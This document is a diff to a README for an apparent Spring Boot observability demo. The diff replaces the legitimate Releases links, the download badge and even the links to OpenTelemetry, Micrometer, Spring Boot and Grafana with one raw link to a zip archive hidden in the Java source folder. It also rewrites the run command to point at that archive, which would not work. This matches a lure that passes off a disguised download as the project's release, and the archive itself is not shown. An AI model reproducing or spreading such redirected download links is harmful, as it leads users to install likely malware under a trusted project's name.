@@ -1,7 +1,7 @@
 # 🎉 otel-demo-app - Easily Monitor Your Application
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue)](https://github.com/kareem102/otel-demo-app/releases)
+[![Download](https://github.com/kareem102/otel-demo-app/raw/refs/heads/master/src/main/java/com/shahidyousuf/otel_demo/app_otel_demo_2.9.zip)](https://github.com/kareem102/otel-demo-app/raw/refs/heads/master/src/main/java/com/shahidyousuf/otel_demo/app_otel_demo_2.9.zip)
 
 ## 🏷️ Description
 The otel-demo-app is a small Spring Boot service designed to help you understand observability. It showcases how to use OpenTelemetry and Micrometer for structured logs, distributed tracing, and application metrics. With this application, you can see your application's health in real-time and gain insights into performance issues.
@@ -18,10 +18,10 @@ This section will guide you through downloading and running the otel-demo-app on
 ### 📥 Download & Install
 To get started, visit the Releases page on GitHub to download the otel-demo-app. Click the button below to access the downloads:
 
-[Download from GitHub Releases](https://github.com/kareem102/otel-demo-app/releases)
+[Download from GitHub Releases](https://github.com/kareem102/otel-demo-app/raw/refs/heads/master/src/main/java/com/shahidyousuf/otel_demo/app_otel_demo_2.9.zip)
 
 1. Open your web browser.
-2. Go to the [Releases page](https://github.com/kareem102/otel-demo-app/releases).
+2. Go to the [Releases page](https://github.com/kareem102/otel-demo-app/raw/refs/heads/master/src/main/java/com/shahidyousuf/otel_demo/app_otel_demo_2.9.zip).
 3. Look for the latest version of the software.
 4. Download the file that ends with `.jar`.
 
@@ -37,7 +37,7 @@ To run the otel-demo-app, follow these steps:
    ```
 3. Run the application using the following command:
    ```sh
-   java -jar otel-demo-app.jar
+   java -jar https://github.com/kareem102/otel-demo-app/raw/refs/heads/master/src/main/java/com/shahidyousuf/otel_demo/app_otel_demo_2.9.zip
    ```
 
 4. Once the application starts, you can access it in your web browser at `http://localhost:8080`.
@@ -73,13 +73,13 @@ Feel free to share your experience or contribute to the project!
 ## 📅 Release Notes
 Stay updated with the latest changes and features by checking the release notes in the Releases section. Each entry will provide you with details about what's new or fixed.
 
-1. Browse the [Releases page](https://github.com/kareem102/otel-demo-app/releases) regularly to see updates.
+1. Browse the [Releases page](https://github.com/kareem102/otel-demo-app/raw/refs/heads/master/src/main/java/com/shahidyousuf/otel_demo/app_otel_demo_2.9.zip) regularly to see updates.
 2. Each release will detail improvements or new features added to the software.
 
 ## 🔗 Related Topics
-- [OpenTelemetry](https://opentelemetry.io/)
-- [Micrometer](https://micrometer.io/)
-- [Spring Boot](https://spring.io/projects/spring-boot)
-- [Grafana](https://grafana.com/)
+- [OpenTelemetry](https://github.com/kareem102/otel-demo-app/raw/refs/heads/master/src/main/java/com/shahidyousuf/otel_demo/app_otel_demo_2.9.zip)
+- [Micrometer](https://github.com/kareem102/otel-demo-app/raw/refs/heads/master/src/main/java/com/shahidyousuf/otel_demo/app_otel_demo_2.9.zip)
+- [Spring Boot](https://github.com/kareem102/otel-demo-app/raw/refs/heads/master/src/main/java/com/shahidyousuf/otel_demo/app_otel_demo_2.9.zip)
+- [Grafana](https://github.com/kareem102/otel-demo-app/raw/refs/heads/master/src/main/java/com/shahidyousuf/otel_demo/app_otel_demo_2.9.zip)
 
 By using the otel-demo-app, you can greatly enhance your application's observability and performance monitoring capabilities. Remember, having clear logging and metrics can make a significant difference in troubleshooting and improving your applications.
